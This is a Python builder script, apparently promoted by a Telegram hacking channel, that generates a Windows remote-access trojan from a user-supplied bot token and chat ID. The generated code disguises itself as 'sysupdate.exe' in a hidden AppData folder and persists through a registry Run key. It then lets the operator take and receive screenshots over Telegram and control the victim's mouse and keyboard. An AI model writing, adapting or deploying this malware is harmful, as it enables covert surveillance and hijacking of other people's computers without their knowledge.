import uuid

print("https://t.me/wantaphacking")
print("1: Build")
print("2: Exit")

choice = input("Select an option (1 or 2): ")

if choice == "2":
    print("Exiting...")
    exit()
elif choice == "1":
    token = input("Enter bot token: ")
    chat_id = input("Enter chat ID: ")
    
    # Generate a unique artifact ID for the output file
    artifact_id = str(uuid.uuid4())
    
    # Code template with user-provided token and chat_id
    code = f"""import telebot
from PIL import Image
import pyautogui
import time
import os
import shutil
import winreg
import sys
import random

# Settings
TOKEN = '{token}'
CHAT_ID = '{chat_id}'
SCREENSHOT_PATH = 'screenshot.png'
APP_NAME = 'sysupdate.exe'
HIDDEN_DIR = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'SystemUpdate')
SCRIPT_PATH = os.path.join(HIDDEN_DIR, APP_NAME)
PNG_PATH = os.path.join(HIDDEN_DIR, 'image.png')

# Create hidden directory and copy script with image
def hide_script():
    try:
        if not os.path.exists(HIDDEN_DIR):
            os.makedirs(HIDDEN_DIR)
        current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        if not os.path.exists(SCRIPT_PATH) or os.path.abspath(current_path) != os.path.abspath(SCRIPT_PATH):
            shutil.copy2(current_path, SCRIPT_PATH)
        # Copy image.png
        source_png = 'image.png' if os.path.exists('image.png') else None
        if source_png and (not os.path.exists(PNG_PATH) or os.path.getmtime(source_png) > os.path.getmtime(PNG_PATH)):
            shutil.copy2(source_png, PNG_PATH)
        return SCRIPT_PATH
    except Exception as e:
        print(f"Error copying: {{e}}")
        return None

# Add to startup
def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'SystemUpdate', 0, winreg.REG_SZ, f'"{{SCRIPT_PATH}}"')
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Error adding to startup: {{e}}")

# Initialization
hide_script()
add_to_startup()

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# Check if message is from the correct chat
def is_valid_chat(message):
    return str(message.chat.id) == CHAT_ID

# Open PNG
@bot.message_handler(commands=['open_png'])
def open_png(message):
    if not is_valid_chat(message):
        return
    try:
        img = Image.open(PNG_PATH)
        img.show()
        bot.reply_to(message, "PNG opened")
    except Exception as e:
        bot.reply_to(message, f"Error: {{e}}")

# Alt+Tab
@bot.message_handler(commands=['alt_tab'])
def alt_tab(message):
    if not is_valid_chat(message):
        return
    pyautogui.hotkey('alt', 'tab')
    bot.reply_to(message, "Alt+Tab executed")

# Alt+F4
@bot.message_handler(commands=['alt_f4'])
def alt_f4(message):
    if not is_valid_chat(message):
        return
    pyautogui.hotkey('alt', 'f4')
    bot.reply_to(message, "Alt+F4 executed")

# Move mouse forward (90 pixels up)
@bot.message_handler(commands=['move_forward'])
def move_forward(message):
    if not is_valid_chat(message):
        return
    x, y = pyautogui.position()
    pyautogui.moveTo(x, y - 90)
    bot.reply_to(message, "Mouse moved forward")

# Move mouse right (90 pixels right)
@bot.message_handler(commands=['move_right'])
def move_right(message):
    if not is_valid_chat(message):
        return
    x, y = pyautogui.position()
    pyautogui.moveTo(x + 90, y)
    bot.reply_to(message, "Mouse moved right")

# Disable mouse for 5 seconds
@bot.message_handler(commands=['disable_mouse'])
def disable_mouse(message):
    if not is_valid_chat(message):
        return
    pyautogui.FAILSAFE = False
    start_time = time.time()
    while time.time() - start_time < 5:
        pyautogui.moveTo(0, 0)
    bot.reply_to(message, "Mouse disabled for 5 seconds")

# Take screenshot
@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    if not is_valid_chat(message):
        return
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(SCREENSHOT_PATH)
        with open(SCREENSHOT_PATH, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(SCREENSHOT_PATH)
    except Exception as e:
        bot.reply_to(message, f"Error: {{e}}")

# Random click on screen
@bot.message_handler(commands=['random_click'])
def random_click(message):
    if not is_valid_chat(message):
        return
    screen_width, screen_height = pyautogui.size()
    x = random.randint(0, screen_width)
    y = random.randint(0, screen_height)
    pyautogui.click(x, y)
    bot.reply_to(message, f"Random click at {{x}}, {{y}}")

# Start bot
if __name__ == '__main__':
    bot.polling()
"""
    # Write the code to a new .py file
    with open("bot_script.py", "w", encoding="utf-8") as f:
        f.write(code)
    print("File 'bot_script.py' created successfully.")
else:
    print("Invalid option. Please select 1 or 2.")
